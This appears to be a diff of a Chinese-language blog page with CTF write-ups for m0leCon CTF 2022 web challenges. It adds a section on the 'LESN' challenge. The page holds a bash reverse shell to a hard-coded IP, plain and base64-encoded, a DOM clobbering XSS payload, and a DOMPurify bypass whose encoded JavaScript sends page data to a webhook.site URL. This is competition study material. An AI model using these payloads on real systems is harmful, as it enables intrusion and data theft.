@@ -28,8 +28,13 @@
 <meta property="og:description" content="m0leCon CTF 2022webhack(pt)MD Hey, do you like markdown? Author: @Xato hackptmd.zip  jackma:123456 Dumb Forum You’re telling me you can’t break such a simple forum  flag在环境变量里 1ENV FLAG&#x3D;&amp;#x27;ptm&amp;#123">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220514124017454.png">
+<meta property="og:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220516085548423.png">
+<meta property="og:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220516090947866.png">
+<meta property="og:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220516092701535.png">
+<meta property="og:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220516092318248.png">
+<meta property="og:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220516110844914.png">
 <meta property="article:published_time" content="2022-05-14T03:57:39.000Z">
-<meta property="article:modified_time" content="2022-05-14T16:39:41.728Z">
+<meta property="article:modified_time" content="2022-05-16T03:08:49.312Z">
 <meta property="article:author" content="b1ue0cean">
 <meta property="article:tag" content="writeup">
 <meta name="twitter:card" content="summary">
@@ -95,7 +100,7 @@
         <li class="menu-item menu-item-about"><a href="/about/" rel="section">About</a></li>
         <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">20</span></a></li>
         <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">10</span></a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">40</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">41</span></a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
         </a>
@@ -152,7 +157,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#m0leCon-CTF-2022"><span class="nav-number">1.</span> <span class="nav-text">m0leCon CTF 2022</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hack-pt-MD"><span class="nav-number">2.1.</span> <span class="nav-text">hack(pt)MD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dumb-Forum"><span class="nav-number">2.2.</span> <span class="nav-text">Dumb Forum</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#m0leCon-CTF-2022"><span class="nav-number">1.</span> <span class="nav-text">m0leCon CTF 2022</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hack-pt-MD"><span class="nav-number">2.1.</span> <span class="nav-text">hack(pt)MD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dumb-Forum"><span class="nav-number">2.2.</span> <span class="nav-text">Dumb Forum</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LESN"><span class="nav-number">3.</span> <span class="nav-text">LESN</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -167,7 +172,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">40</span>
+          <span class="site-state-item-count">41</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -270,7 +275,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-05-15 00:39:41" itemprop="dateModified" datetime="2022-05-15T00:39:41+08:00">2022-05-15</time>
+      <time title="Modified: 2022-05-16 11:08:49" itemprop="dateModified" datetime="2022-05-16T11:08:49+08:00">2022-05-16</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -349,6 +354,42 @@
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/101.43.33.148/</span><span class="number">10099</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">base64版：bash -c <span class="string">&#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMzMuMTQ4LzEwMDk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>这么绕过?</p>
+<h2 id="LESN"><a href="#LESN" class="headerlink" title="LESN"></a>LESN</h2><p>周六一天实验  中午晚上看了看比赛 没时间看这题 晚上来复现一下</p>
+<p>上传一张正确的图片后 毛用都没有</p>
+<p>上传错误的图片后 可以发现</p>
+<img src="/2022/05/14/m0leCon-CTF-2022/image-20220516085548423.png" alt="image-20220516085548423" style="zoom:67%;">
+
+<p>重点是这题不给源码就离谱（主要是我太菜了</p>
+<img src="/2022/05/14/m0leCon-CTF-2022/image-20220516090947866.png" alt="image-20220516090947866" style="zoom:67%;">
+
+<p>点进去看一下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">redirect_error_image</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">location</span> = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="title function_">toString</span>().<span class="title function_">replace</span>(<span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;edit&#x27;</span>) + <span class="string">&#x27;?err=Invalid+image,+please+change+url&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">redirect_home</span>(<span class="params">err</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;/?err=&#x27;</span> + err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">redirect_to</span>(<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">location</span> = url</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们知道</p>
+<img src="/2022/05/14/m0leCon-CTF-2022/image-20220516092701535.png" alt="image-20220516092701535" style="zoom:33%;">
+
+<p>我们又知道 可以用 Dom clobbering 来覆盖 document 对象的某些值来形成xss攻击（可以去看看陆队的一篇文章</p>
+<img src="/2022/05/14/m0leCon-CTF-2022/image-20220516092318248.png" alt="image-20220516092318248" style="zoom: 50%;">
+
+<p>所以我们尝试构造payload  来进行xss攻击</p>
+<p>大家自己搞个html试一下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://ctf.m0lecon.it/img/pwnthem0le_logo.pn&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;setTimeout(redirect_error_image,1500)&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">style</span>=<span class="string">&quot;max-height: 300px; max-width: 300px; display:block; margin: auto; border: 2px solid #555;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">b1ue0cean:</span>&#x27;<span class="attr">a</span>&#x27;;<span class="attr">alert</span>(<span class="attr">1</span>) <span class="attr">id</span>=<span class="string">redirect_error_image</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但我们发现 他还对payload进行了过滤 所以我们还要绕过过滤才行</p>
+<p>看了wp 应该是用了过时的 Dompurify  </p>
+<p>然后拿以前版本的绕过来进行xss</p>
+<p>好了现在我们可以xss了</p>
+<p>我们先挂一个正确的图片的地址 （可以在本地  这样到了bot还会正常报错 是我们的payload成功执行）</p>
+<p>但有一个问题就是script加载后 会有缓存 会导致我们的payload失效</p>
+<p>为了避免缓存的话 可以再开一个 页面 用 iframe 来加载</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;a class=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">mailto:</span>&#x27;<span class="attr">a</span>&#x27;;<span class="attr">eval</span>(<span class="attr">atob</span>(&#x27;<span class="attr">ZmV0Y2goJy9wb3N0JykudGhlbihyPT5yLnRleHQoKSkudGhlbih0PT57eD0vcG9zdFwvW1x3LV0qL2cuZXhlYyh0KTtmZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvMzQ2OGRlNDQtM2ZlOS00NjkyLWFiOGUtMzczZmE0M2VhMTg0LycreFswXSl9KS8v</span>&#x27;)) <span class="attr">id</span>=<span class="string">redirect_error_image</span> &gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>base64部分</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&#x27;/post&#x27;</span>).then(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="built_in">text</span>()).then(<span class="function"><span class="params">t</span>=&gt;</span>&#123;x=<span class="regexp">/post\/[\w-]*/g</span>.exec(t);fetch(<span class="string">&#x27;https://webhook.site/3468de44-3fe9-4692-ab8e-373fa43ea184/&#x27;</span>+x[<span class="number">0</span>])&#125;)<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/14/m0leCon-CTF-2022/image-20220516110844914.png" alt="image-20220516110844914"></p>
+<p><a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/xss-naxienian/content/9.html">https://wizardforcel.gitbooks.io/xss-naxienian/content/9.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.xray.cool/post/12cases-about-xss-part1/#iframe%E7%9A%84windowname%E8%B7%A8%E5%9F%9F%E4%BC%A0%E8%BE%93">https://blog.xray.cool/post/12cases-about-xss-part1/#iframe%E7%9A%84windowname%E8%B7%A8%E5%9F%9F%E4%BC%A0%E8%BE%93</a></p>
 
     </div>
 
@@ -414,6 +455,9 @@
                 </a>
             </div>
             <div class="post-nav-item">
+                <a href="/2022/05/15/hackme-pwn/" rel="next" title="hackme-pwn">
+                  hackme-pwn <i class="fa fa-chevron-right"></i>
+                </a>
             </div>
           </div>
     </footer>
